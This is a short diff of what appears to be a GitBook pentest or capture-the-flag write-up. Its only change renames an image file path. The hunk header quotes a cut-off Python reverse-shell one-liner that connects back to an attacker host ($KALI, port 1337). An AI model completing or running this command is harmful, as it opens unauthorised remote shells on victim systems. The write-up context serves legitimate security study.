@@ -191,5 +191,5 @@ export RHOST="$KALI";export RPORT=1337;python3 -c 'import socket,os,pty;s=socket
 
 <figure><img src="../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>
 
